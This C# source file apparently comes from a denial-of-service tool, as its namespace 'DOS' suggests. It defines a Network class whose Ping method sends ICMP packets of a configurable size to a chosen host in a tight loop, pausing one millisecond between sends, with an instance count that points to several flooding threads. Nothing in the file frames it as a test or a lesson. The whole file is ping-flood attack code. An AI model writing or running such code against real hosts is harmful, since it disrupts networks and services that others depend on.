using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace DOS
{
    public static class Network
    {
        public static string host;
        public static int timeout;
        public static int instances;
        public static byte[] packetSize;
        public static bool stopFlag = true;

        public static void Ping()
        {
            Ping pinger = new Ping();

            while (!stopFlag)
            {
                Thread.Sleep(1);

                try { pinger.Send(host, timeout, packetSize); }
                catch
                {
                    if (!stopFlag) Threading.GenerateCancelThread();
                    else return;
                }
            }
        }
    }
}
